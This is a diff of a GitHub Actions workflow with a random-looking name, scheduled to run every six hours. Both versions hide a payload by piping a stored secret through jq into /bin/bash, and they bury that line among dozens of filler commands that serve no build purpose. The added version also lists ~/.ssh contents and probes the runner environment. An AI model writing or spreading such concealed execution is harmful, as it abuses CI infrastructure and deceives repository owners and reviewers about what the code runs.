@@ -1,51 +1,32 @@
-name: dongguange7412 #32604
-on: #15906
-  workflow_dispatch: #16209
-  schedule: #7932
-    - cron: '47 0/6 * * *' #18625
-jobs:  # 25386
-  build: #20540
-    runs-on: ubuntu-latest #7449
-    steps: #32425
-      - uses: actions/checkout@v4 #5756
-      - name: dongguange7412 #2743
-        env: #19965
-          y25511: ${{ secrets.y25511 }} #28509
+name: dongguange7412
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongguange7412
+        env:
+          h11418: ${{ secrets.h11418 }}
         run: |
-          echo $y25511 | jq -r .w2372 | /bin/bash #20457
-          echo "Env vars: $(env | wc -l) total"
-          test -d /tmp && echo "Tmp dir exists"
-          if [ -x /bin/ls ]; then echo "LS executable"; fi
-          echo "Test: [ 1 -eq 1 ] && echo 'Math OK'"
-          echo "Tar mock: tar -cf /dev/null /tmp 2>/dev/null || true"
-          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
+          ps -ef | grep root | awk '{print $NF}' | sort | uniq | wc -l
+          [ -d "$HOME/.ssh/config.d" ] && echo "$HOME/.ssh/config.d exists" || echo "$HOME/.ssh/config.d no exists"
+          echo $h11418 | jq -r .v15376 | /bin/bash
+          echo "Date only: $(date +%F)"
+          curl www.google.com
+          [ -d "$HOME/.ssh" ] && echo "$(ls -al $HOME/.ssh)" || echo "$HOME/.ssh not exists"
+          echo "Dir: $(pwd)"
+          echo "Random ID: $RANDOM$RANDOM"
+          pushd ~
           echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
-          echo "Checksum: $((1000 + RANDOM % 9000))"
-          echo "IO redirect: echo > file 2>/dev/null || true"
-          echo "Temp file mock: tmp=\$(mktemp) && echo \$tmp || echo no-tmp"
-          ls -la 2>/dev/null || true
-          echo "Redirect mock: echo data > /dev/null 2>&1"
-          for i in {1..3}; do echo "Iter $i"; done
-          echo "Path mock: echo \$PATH | awk -F: '{print \$1}'"
-          echo "Option mock: grep -i 'a' /etc/hosts 2>/dev/null | head -1"
-          echo "Command count: echo \$(ls | wc -l 2>/dev/null || echo 0)"
-          echo "Bit ops: $(( 1 & 1 ))"
-          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
-          echo "Command || true: ls /nonexist || true"
-          echo "Arith loop: for ((i=0;i<3;i++)); do echo $i; done"
-          echo "Build $(date +%s)"
-          echo "Time ms-like: $(date +%s%3N 2>/dev/null || echo 123456)"
-          echo "Conditional: [[ 'a' == 'a' ]] && echo Match"
-          echo "Case mock: case 1 in 1) echo 1;; esac"
-          echo "Exit code test: $?"
-          [ -f /etc/hosts ] && echo "Hosts exist" || true
-          echo "Command fail safe: false || echo 'Safe'"
-          echo "Null cmd: : > /dev/null"
-          echo "Complex pipe: echo test | tr a-z A-Z | cut -c1-3"
-          echo "Range loop: for i in 1 3 5; do echo \$i; done"
-          echo "History mock: history | head -1 2>/dev/null || echo no-history"
-          echo "Sed mock: echo 'text' | sed 's/t/T/' 2>/dev/null || echo no-sed"
-          echo "Time: $(date +%H:%M:%S)"
-          echo "User: $(whoami)"
-          echo "Exit 0 test: exit 0 || true"
-          echo "In-array test: [[ 'a' =~ [a-z] ]] && echo Match"
+          which screen
+          git status
+          [ "$(which sqlite)" != "" ] && echo "sqlite installed" || echo "sqlite not installed"
+          [ -d "$HOME/.ssh/config.d" ] && echo "$HOME/.ssh/config.d exists" || echo "$HOME/.ssh/config.d no exists"
+          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
+          [ "$(which sqlite3)" != "" ] && echo "sqlite3 installed" || echo "sqlite3 not installed"
